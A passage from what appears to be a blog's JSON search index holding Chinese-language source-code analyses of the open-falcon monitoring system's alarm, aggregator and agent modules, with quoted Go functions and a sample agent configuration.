(｡A｡)\")\n\t})\n\tgraph.Routes(r)\n\tuic.Routes(r)\n\ttemplate.Routes(r)\n\tstrategy.Routes(r)\n\thost.Routes(r)\n\texpression.Routes(r)\n\tmockcfg.Routes(r)\n\tdashboard_graph.Routes(r)\n\tdashboard_screen.Routes(r)\n\talarm.Routes(r)\n\tr.Run(port)\n}\n```\n\n这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon alarm 源码分析","url":"/2020/01/21/alarm源码分析/","content":"\n## open-falcon alarm 源码分析\n\n主函数在modules/alarm/main中\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\n\tg.ParseConfig(*cfg)\n\n\tg.InitLog(g.Config().LogLevel)\n\tif g.Config().LogLevel != \"debug\" {\n\t\tgin.SetMode(gin.ReleaseMode)\n\t}\n\t//初始化redis连接池\n\tg.InitRedisConnPool()\n    // 初始化数据库\n\tmodel.InitDatabase()\n    // 启动定时发送channel\n\tcron.InitSenderWorker()\n\t// 启动http服务\n\tgo http.Start()\n    // 定时读取highevent\n\tgo cron.ReadHighEvent()\n    // 定时读取lowevent\n\tgo cron.ReadLowEvent()\n    // 组装Mail信息，群发功能\n\tgo cron.CombineSms()\n\tgo cron.CombineMail()\n\tgo cron.CombineIM()\n    // 发送邮件功能\n\tgo cron.ConsumeIM()\n\tgo cron.ConsumeSms()\n\tgo cron.ConsumeMail()\n    // 清理过期事件\n\tgo cron.CleanExpiredEvent()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tg.RedisConnPool.Close()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n事件读取任务以highevent为例子：\n\n```go\nfunc ReadHighEvent() {\n    // 获取优先级高的队列\n\tqueues := g.Config().Redis.HighQueues\n\tif len(queues) == 0 {\n\t\treturn\n\t}\n\n\tfor {\n        //  出队\n\t\tevent, err := popEvent(queues)\n\t\tif err != nil {\n\t\t\ttime.Sleep(time.Second)\n\t\t\tcontinue\n\t\t}\n        // 消费队列\n\t\tconsume(event, true)\n\t}\n}\n```\n\n```go\nfunc consume(event *cmodel.Event, isHigh bool) {\n\tactionId := event.ActionId()\n\tif actionId <= 0 {\n\t\treturn\n\t}\n\n\taction := api.GetAction(actionId)\n\tif action == nil {\n\t\treturn\n\t}\n\n\tif action.Callback == 1 {\n\t\tHandleCallback(event, action)\n\t}\n\n\tif isHigh {\n\t\tconsumeHighEvents(event, action)\n\t} else {\n\t\tconsumeLowEvents(event, action)\n\t}\n}\n```\n\nconsumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去：\n\n```go\nfunc WriteMailModel(mail *model.Mail) {\n\tif mail == nil {\n\t\treturn\n\t}\n\n\tbs, err := json.Marshal(mail)\n\tif err != nil {\n\t\tlog.Error(err)\n\t\treturn\n\t}\n\n\tlog.Debugf(\"write mail to queue, mail:%v, queue:%s\", mail, MAIL_QUEUE_NAME)\n\tlpush(MAIL_QUEUE_NAME, string(bs))\n}\n```\n\n```go\nfunc combineMail() {\n\tdtos := popAllMailDto()\n\tcount := len(dtos)\n\tif count == 0 {\n\t\treturn\n\t}\n\n\tdtoMap := make(map[string][]*MailDto)\n\tfor i := 0; i < count; i++ {\n\t\tkey := fmt.Sprintf(\"%d%s%s%s\", dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric)\n\t\tif _, ok := dtoMap[key]; ok {\n\t\t\tdtoMap[key] = append(dtoMap[key], dtos[i])\n\t\t} else {\n\t\t\tdtoMap[key] = []*MailDto{dtos[i]}\n\t\t}\n\t}\n\n\t// 不要在这处理，继续写回redis，否则重启alarm很容易丢数据\n\tfor _, arr := range dtoMap {\n\t\tsize := len(arr)\n\t\tif size == 1 {\n\t\t\tredi.WriteMail([]string{arr[0].Email}, arr[0].Subject, arr[0].Content)\n\t\t\tcontinue\n\t\t}\n\n\t\tsubject := fmt.Sprintf(\"[P%d][%s] %d %s\", arr[0].Priority, arr[0].Status, size, arr[0].Metric)\n\t\tcontentArr := make([]string, size)\n\t\tfor i := 0; i < size; i++ {\n\t\t\tcontentArr[i] = arr[i].Content\n\t\t}\n\t\tcontent := strings.Join(contentArr, \"\\r\\n\")\n\n\t\tlog.Debugf(\"combined mail subject:%s, content:%s\", subject, content)\n\t\tredi.WriteMail([]string{arr[0].Email}, subject, content)\n\t}\n}\n```\n\n设置以天为单位的过期删除事件，数据库中删除。\n\n```go\nfunc CleanExpiredEvent() {\n\tfor {\n\n\t\tretention_days := g.Config().Housekeeper.EventRetentionDays\n\t\tdelete_batch := g.Config().Housekeeper.EventDeleteBatch\n\n\t\tnow := time.Now()\n\t\tbefore := now.Add(time.Duration(-retention_days*24) * time.Hour)\n\t\teventmodel.DeleteEventOlder(before, delete_batch)\n\n\t\ttime.Sleep(time.Second * 60)\n\t}\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon aggregator源码分析","url":"/2020/01/21/aggregator源码分析/","content":"\n## open-falcon aggregator源码分析\n\n 主流程module/aggregator/main中：\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\thelp := flag.Bool(\"h\", false, \"help\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *help {\n\t\tflag.Usage()\n\t\tos.Exit(0)\n\t}\n\t// 配置文件解析\n\tg.ParseConfig(*cfg)\n    // 数据库初始化\n\tdb.Init()\n\t// http服务启动，接口查询所有的cluster信息\n\tgo http.Start()\n    //定时更新cluster数据，并启动worker启动，用于计算平均指标数据\n\tgo cron.UpdateItems()\n\n\t// sdk configuration\n\tsender.Debug = g.Config().Debug\n\tsender.PostPushUrl = g.Config().Api.PushApi\n\n    // 数据推送\n\tsender.StartSender()\n\n\tsigs := make(chan os.Signal, 1)\n\tsignal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)\n\tgo func() {\n\t\t<-sigs\n\t\tfmt.Println()\n\t\tos.Exit(0)\n\t}()\n\n\tselect {}\n}\n```\n\n主要功能在UpdateItems函数中：\n\n```go\nfunc updateItems() {\n\titems, err := db.ReadClusterMonitorItems()\n\tif err != nil {\n\t\treturn\n\t}\n\n\tdeleteNoUseWorker(items)\n\tcreateWorkerIfNeed(items)\n}\n```\n\n首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。\n\n```go\nfunc deleteNoUseWorker(m map[string]*g.Cluster) {\n\tdel := []string{}\n\tfor key, worker := range Workers {\n\t\tif _, ok := m[key]; !ok {\n\t\t\tworker.Drop()\n\t\t\tdel = append(del, key)\n\t\t}\n\t}\n\n\tfor _, key := range del {\n\t\tdelete(Workers, key)\n\t}\n}\n```\n\n如果还没有监控则创建worker任务：\n\n```go\nfunc createWorkerIfNeed(m map[string]*g.Cluster) {\n\tfor key, item := range m {\n\t\tif _, ok := Workers[key]; !ok {\n\t\t\tif item.Step <= 0 {\n\t\t\t\tlog.Println(\"[W] invalid cluster(step <= 0):\", item)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tworker := NewWorker(item)\n\t\t\tWorkers[key] = worker\n\t\t\tworker.Start() // 启动\n\t\t}\n\t}\n}\n```\n\n```go\nfunc (this Worker) Start() {\n\tgo func() {\n\t\ts1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id)\n\t\tr1 := rand.New(s1)\n\t\t// 60s, step usually\n\t\tdelay := r1.Int63n(60000)\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"[I] after %5d ms, start worker %d\", delay, this.ClusterItem.Id)\n\t\t}\n\n\t\ttime.Sleep(time.Duration(delay) * time.Millisecond)\n\t\tthis.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second)\n\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-this.Ticker.C:\n\t\t\t\tWorkerRun(this.ClusterItem)\n\t\t\tcase <-this.Quit:\n\t\t\t\tif g.Config().Debug {\n\t\t\t\t\tlog.Println(\"[I] drop worker\", this.ClusterItem)\n\t\t\t\t}\n\t\t\t\tthis.Ticker.Stop()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}()\n}\n```\n\n设置定时器执行函数WorkerRun\n\n```go\nfunc WorkerRun(item *g.Cluster) {\n\tdebug := g.Config().Debug\n\n\tnumeratorStr := cleanParam(item.Numerator)        //\n\tdenominatorStr := cleanParam(item.Denominator)\n\n\tif !expressionValid(numeratorStr) || !expressionValid(denominatorStr) {\n\t\tlog.Println(\"[W] invalid numerator or denominator\", item)\n\t\treturn\n\t}\n    // 判断包含$(需要解析\n\tneedComputeNumerator := needCompute(numeratorStr)\n\tneedComputeDenominator := needCompute(denominatorStr)\n\n\tif !needComputeNumerator && !needComputeDenominator {\n\t\tlog.Println(\"[W] no need compute\", item)\n\t\treturn\n\t}\n\n    // 解析算子\n\tnumeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator)\n\tdenominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator)\n\n    // 操作非法\n\tif !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) {\n\t\tlog.Println(\"[W] operators invalid\", item)\n\t\treturn\n\t}\n\t// 根据id获取hostname\n\thostnames, err := sdk.HostnamesByID(item.GroupId)\n\tif err != nil || len(hostnames) == 0 {\n\t\treturn\n\t}\n\n\tnow := time.Now().Unix()\n\t// 获取最新的数据点\n\tvalueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-int64(item.Step*2), now)\n\tif err != nil {\n\t\tlog.Println(\"[E]\", err, item)\n\t\treturn\n\t}\n\n\tvar numerator, denominator float64\n\tvar validCount int\n\t// 每个机器计算\n\tfor _, hostname := range hostnames {\n\t\tvar numeratorVal, denominatorVal float64\n\t\tvar err error\n\t\t// 需要计算分子\n\t\tif needComputeNumerator {\n\t\t\tnumeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [numerator:%s] id:%d, err:%v\", hostname, item.Numerator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f\", hostname, item.Numerator, item.Id, numeratorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\t\t// 需要计算分母\n\t\tif needComputeDenominator {\n\t\t\tdenominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap)\n\n\t\t\tif debug && err != nil {\n\t\t\t\tlog.Printf(\"[W] [hostname:%s] [denominator:%s] id:%d, err:%v\", hostname, item.Denominator, item.Id, err)\n\t\t\t} else if debug {\n\t\t\t\tlog.Printf(\"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f\", hostname, item.Denominator, item.Id, denominatorVal)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t}\n\n\t\tif debug {\n\t\t\tlog.Printf(\"[D] hostname:%s  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal)\n\t\t}\n\t\tnumerator += numeratorVal\n\t\tdenominator += denominatorVal\n\t\tvalidCount += 1\n\t}\n\t// 不需要要计算分子\n\tif !needComputeNumerator {\n\t\tif numeratorStr == \"$#\" {\n\t\t\tnumerator = float64(validCount)\n\t\t} else {\n\t\t\tnumerator, err = strconv.ParseFloat(numeratorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", numeratorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\t// 不需要计算分母\n\tif !needComputeDenominator {\n\t\tif denominatorStr == \"$#\" {\n\t\t\tdenominator = float64(validCount)\n\t\t} else {\n\t\t\tdenominator, err = strconv.ParseFloat(denominatorStr, 64)\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", denominatorStr, err, item.Id)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t}\n\n\tif denominator == 0 {\n\t\tlog.Println(\"[W] denominator == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif validCount == 0 {\n\t\tlog.Println(\"[W] validCount == 0, id:\", item.Id)\n\t\treturn\n\t}\n\n\tif debug {\n\t\tlog.Printf(\"[D] hostname:all  numerator:%0.4f  denominator:%0.4f  per:%0.4f\\n\", numerator, denominator, numerator/denominator)\n\t}\n    // sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！\n\tsender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, int64(item.Step))\n}\n```\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"open-falcon agent源码分析","url":"/2020/01/21/agent源码分析/","content":"\n## open-falcon agent源码分析\n\n因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。\n\n本篇文章主要是针对open-falcon 中agent模块进行分析。\n\n主流程再module/agent/module中\n\n```go\nfunc main() {\n\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tcheck := flag.Bool(\"check\", false, \"check collector\")\n\t//解析参数\n\tflag.Parse()\n\t\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\tif *check {\n        // 检查当前系统磁盘cpu等信息，有问题就退出\n\t\tfuncs.CheckCollector()\n\t\tos.Exit(0)\n\t}\n\t//解析配置文件\n\tg.ParseConfig(*cfg)\n\n\tif g.Config().Debug {\n\t\tg.InitLog(\"debug\")\n\t} else {\n\t\tg.InitLog(\"info\")\n\t}\n\t// 初始化root目录\n\tg.InitRootDir()\n    // localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip\n\tg.InitLocalIp()\n    // 初始化rpc客户端\n\tg.InitRpcClients()\n\t// 构建需要抓取的指标数据\n\tfuncs.BuildMappers()\n\t// 定时更新cpu和disk状态历史数据\n\tgo cron.InitDataHistory()\n\t// 定时给hbs报告agent本机状态\n\tcron.ReportAgentStatus()\n    //同步插件，没咋用过\n\tcron.SyncMinePlugins()\n    //调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL\n\tcron.SyncBuiltinMetrics()\n    //定时检查信任ip\n\tcron.SyncTrustableIps()\n    //定时收集指标数据\n\tcron.Collect()\n\t//启动http接口方便查询\n\tgo http.Start()\n\n\tselect {}\n\n}\n```\n\n先来看下配置文件：\n\n```json\n{\n    \"debug\": true,\n    \"hostname\": \"\",         \n    \"ip\": \"\",\n    \"plugin\": {               # 插件\n        \"enabled\": false,\n        \"dir\": \"./plugin\",\n        \"git\": \"https://github.com/open-falcon/plugin.git\",\n        \"logs\": \"./logs\"\n    },\n    \"heartbeat\": {            # 心跳\n        \"enabled\": true,\n        \"addr\": \"127.0.0.1:6030\",\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"transfer\": {             # 传输地址\n        \"enabled\": true,\n        \"addrs\": [\n            \"127.0.0.1:8433\",\n            \"127.0.0.1:8433\"\n        ],\n        \"interval\": 60,\n        \"timeout\": 1000\n    },\n    \"http\": {                # http\n        \"enabled\": true,\n        \"listen\": \":1988\",\n        \"backdoor\": false\n    },\n    \"collector\": {          # 收集接口数据\n        \"ifacePrefix\": [\"eth\", \"em\"],\n        \"mountPoint\": []\n    },\n    \"default_tags\": {\n    },\n    \"ignore\": {                    \n        \"cpu.busy\": true,\n        \"df.bytes.free\": true,\n        \"df.bytes.total\": true,\n        \"df.bytes.used\": true,\n        \"df.bytes.used.percent\": true,\n        \"df.inodes.total\": true,\n        \"df.inodes.free\": true,\n        \"df.inodes.used\": true,\n        \"df.inodes.used.percent\": true,\n        \"mem.memtotal\": true,\n        \"mem.memused\": true,\n        \"mem.memused.percent\": true,\n        \"mem.memfree\": true,\n        \"mem.swaptotal\": true,\n        \"mem.swapused\": true,\n        \"mem.swapfree\": true\n    }\n}\n\n```\n\n先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。\n\n```go\nfunc InitRootDir() {\n\tvar err error\n\tRoot, err = os.Getwd()\n\tif err != nil {\n\t\tlog.Fatalln(\"getwd fail:\", err)\n\t}\n}\n```\n\n获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。\n\n```go\nfunc InitLocalIp() {\n\tif Config().Heartbeat.Enabled {\n\t\tconn, err := net.DialTimeout(\"tcp\", Config().Heartbeat.Addr, time.Second*10)\n\t\tif err != nil {\n\t\t\tlog.Println(\"get local addr failed !\")\n\t\t} else {\n\t\t\tLocalIp = strings.Split(conn.LocalAddr().String(), \":\")[0]\n\t\t\tconn.Close()\n\t\t}\n\t} else {\n\t\tlog.Println(\"hearbeat is not enabled, can't get localip\")\n\t}\n}\n```\n\n初始化hbs的rpc客户端连接：\n\n```go\nfunc InitRpcClients() {\n\tif Config().Heartbeat.Enabled {\n\t\tHbsClient = &SingleConnRpcClient{\n\t\t\tRpcServer: Config().Heartbeat.Addr,\n\t\t\tTimeout:   time.Duration(Config().Heartbeat.Timeout) * time.Millisecond,\n\t\t}\n\t}\n}\n```\n\n函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。\n\n```go\nfunc BuildMappers() {\n\tinterval := g.Config().Transfer.Interval\n\tMappers = []FuncsAndInterval{\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tAgentMetrics,\n\t\t\t\tCpuMetrics,\n\t\t\t\tNetMetrics,\n\t\t\t\tKernelMetrics,\n\t\t\t\tLoadAvgMetrics,\n\t\t\t\tMemMetrics,\n\t\t\t\tDiskIOMetrics,\n\t\t\t\tIOStatsMetrics,\n\t\t\t\tNetstatMetrics,\n\t\t\t\tProcMetrics,\n\t\t\t\tUdpMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDeviceMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tPortMetrics,\n\t\t\t\tSocketStatSummaryMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tDuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tUrlMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t\t{\n\t\t\tFs: []func() []*model.MetricValue{\n\t\t\t\tGpuMetrics,\n\t\t\t},\n\t\t\tInterval: interval,\n\t\t},\n\t}\n}\n```\n\n函数InitDataHistory：\n\n```go\nfunc InitDataHistory() {\n\tfor {\n\t\tfuncs.UpdateCpuStat()  //更新cpu状态信息   方便后续统计的时候用到了。\n\t\tfuncs.UpdateDiskStats()  // 更新disk状态信息\n\t\ttime.Sleep(g.COLLECT_INTERVAL)  // 间隔\n\t}\n}\n```\n\n函数reportAgentStatus函数：\n\n```go\nfunc ReportAgentStatus() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second)\n\t}\n}\n```\n\nReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装：\n\n```go\nfunc reportAgentStatus(interval time.Duration) {\n\tfor {\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\thostname = fmt.Sprintf(\"error:%s\", err.Error())\n\t\t}\n\n\t\treq := model.AgentReportRequest{\n\t\t\tHostname:      hostname,\n\t\t\tIP:            g.IP(),\n\t\t\tAgentVersion:  g.VersionMsg(),\n\t\t\tPluginVersion: g.GetCurrPluginVersion(),\n\t\t}\n\n\t\tvar resp model.SimpleRpcResponse\n        // 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了\n\t\terr = g.HbsClient.Call(\"Agent.ReportStatus\", req, &resp)\n\t\tif err != nil || resp.Code != 0 {\n\t\t\tlog.Println(\"call Agent.ReportStatus fail:\", err, \"Request:\", req, \"Response:\", resp)\n\t\t}\n\n\t\ttime.Sleep(interval)\n\t}\n}\n```\n\n类似的SyncMinPlugins函数：\n\n```go\nfunc SyncMinePlugins() {\n\tif !g.Config().Plugin.Enabled {\n\t\treturn\n\t}\n\n\tif !g.Config().Heartbeat.Enabled {\n\t\treturn\n\t}\n\n\tif g.Config().Heartbeat.Addr == \"\" {\n\t\treturn\n\t}\n\n\tgo syncMinePlugins()\n}\n```\n\n调用函数syncMinePlugins：\n\n```go\nfunc syncMinePlugins() {\n\n\tvar (\n\t\ttimestamp  int64 = -1\n\t\tpluginDirs []string\n\t)\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\t\t\n\t\treq := model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t}\n\n\t\tvar resp model.AgentPluginsResponse\n        // hbs rpc接口MinePlugins，用来获取MinePlugin插件信息\n\t\terr = g.HbsClient.Call(\"Agent.MinePlugins\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"call Agent.MinePlugin fail:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tpluginDirs = resp.Plugins\n\t\ttimestamp = resp.Timestamp\n\t\t// 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"call Agent.MinePlugin:%v\\n\", resp)\n\t\t}\n\n\t\tif len(pluginDirs) == 0 {\n\t\t\tplugins.ClearAllPlugins()\n\t\t\tcontinue\n\t\t}\n\n\t\tdesiredAll := make(map[string]*plugins.Plugin)\n\t\tfilefmt_scripts := [][]string{}\n\t\tdirfmt_scripts := []string{}\n\n\t\tfor _, script_path := range pluginDirs {\n\t\t\t//script_path could be a DIR or a SCRIPT_FILE_WITH_OR_WITHOUT_ARGS\n\t\t\t//比如： sys/ntp/60_ntp.py(arg1,arg2) 或者 sys/ntp/60_ntp.py 或者 sys/ntp\n\t\t\t//1. 参数只对单个脚本文件生效，目录不支持参数\n\t\t\t//2. 如果某个目录下的某个脚本被单独绑定到某个机器，那么再次绑定该目录时，该文件会不会再次执行\n\t\t\tvar args string = \"\"\n\n\t\t\tre := regexp.MustCompile(`(.*)\\((.*)\\)`)\n\t\t\tpath_args := re.FindAllStringSubmatch(script_path, -1)\n\t\t\tif path_args != nil {\n\t\t\t\tscript_path = path_args[0][1]\n\t\t\t\targs = path_args[0][2]\n\t\t\t}\n\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_path)\n\t\t\tif !file.IsExist(abs_path) {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif file.IsFile(abs_path) {\n\t\t\t\tfilefmt_scripts = append(filefmt_scripts, []string{script_path, args})\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tdirfmt_scripts = append(dirfmt_scripts, script_path)\n\t\t}\n\n\t\ttaken := make(map[string]struct{})\n\t\tfor _, script_file := range filefmt_scripts {\n\t\t\tabs_path := filepath.Join(g.Config().Plugin.Dir, script_file[0])\n\t\t\t_, file_name := filepath.Split(abs_path)\n\t\t\tarr := strings.Split(file_name, \"_\")\n\t\t\tvar cycle int\n\t\t\tvar err error\n\t\t\tcycle, err = strconv.Atoi(arr[0])\n\t\t\tif err == nil {\n\t\t\t\tfi, _ := os.Stat(abs_path)\n\t\t\t\tplugin := &plugins.Plugin{FilePath: script_file[0], MTime: fi.ModTime().Unix(), Cycle: cycle, Args: script_file[1]}\n\t\t\t\tdesiredAll[script_file[0]+\"(\"+script_file[1]+\")\"] = plugin\n\t\t\t}\n\t\t\t//针对某个 hostgroup 绑定了单个脚本后，再绑定该脚本的目录时，会忽略目录中的该文件\n\t\t\ttaken[script_file[0]] = struct{}{}\n\t\t}\n\n\t\tfor _, script_path := range dirfmt_scripts {\n\t\t\tps := plugins.ListPlugins(strings.Trim(script_path, \"/\"))\n\t\t\tfor k, p := range ps {\n\t\t\t\tif _, ok := taken[k]; ok {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tdesiredAll[k] = p\n\t\t\t}\n\t\t}\n\n\t\tplugins.DelNoUsePlugins(desiredAll)\n\t\tplugins.AddNewPlugins(desiredAll)\n\n\t\tif g.Config().Debug {\n\t\t\tlog.Printf(\"current plugins:%v\\n\", plugins.Plugins)\n\t\t}\n\t}\n}\n```\n\n下面需要获取监控端口和路径：\n\n```go\nfunc SyncBuiltinMetrics() {\n\tif g.Config().Heartbeat.Enabled && g.Config().Heartbeat.Addr != \"\" {\n\t\tgo syncBuiltinMetrics()\n\t}\n}\n```\n\n```go\nfunc syncBuiltinMetrics() {\n\n\tvar timestamp int64 = -1\n\tvar checksum string = \"nil\"\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ports = []int64{}\n\t\tvar paths = []string{}\n\t\tvar procs = make(map[string]map[int]string)\n\t\tvar urls = make(map[string]string)\n\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\treq := model.AgentHeartbeatRequest{\n\t\t\tHostname: hostname,\n\t\t\tChecksum: checksum,\n\t\t}\n\n\t\tvar resp model.BuiltinMetricResponse\n        // 调用rpc接口获取监控端口和路径\n\t\terr = g.HbsClient.Call(\"Agent.BuiltinMetrics\", req, &resp)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR:\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Timestamp <= timestamp {\n\t\t\tcontinue\n\t\t}\n\n\t\tif resp.Checksum == checksum {\n\t\t\tcontinue\n\t\t}\n\n\t\ttimestamp = resp.Timestamp\n\t\tchecksum = resp.Checksum\n\n\t\tfor _, metric := range resp.Metrics {\n\n\t\t\tif metric.Metric == g.URL_CHECK_HEALTH {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\turl := strings.Split(arr[0], \"=\")\n\t\t\t\tif len(url) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tstime := strings.Split(arr[1], \"=\")\n\t\t\t\tif len(stime) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tif _, err := strconv.ParseInt(stime[1], 10, 64); err == nil {\n\t\t\t\t\turls[url[1]] = stime[1]\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metric ParseInt timeout failed:\", err)\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif metric.Metric == g.NET_PORT_LISTEN {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tif port, err := strconv.ParseInt(arr[1], 10, 64); err == nil {\n\t\t\t\t\tports = append(ports, port)\n\t\t\t\t} else {\n\t\t\t\t\tlog.Println(\"metrics ParseInt failed:\", err)\n\t\t\t\t}\n\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.DU_BS {\n\t\t\t\tarr := strings.Split(metric.Tags, \"=\")\n\t\t\t\tif len(arr) != 2 {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\n\t\t\t\tpaths = append(paths, strings.TrimSpace(arr[1]))\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif metric.Metric == g.PROC_NUM {\n\t\t\t\tarr := strings.Split(metric.Tags, \",\")\n\n\t\t\t\ttmpMap := make(map[int]string)\n\n\t\t\t\tfor i := 0; i < len(arr); i++ {\n\t\t\t\t\tif 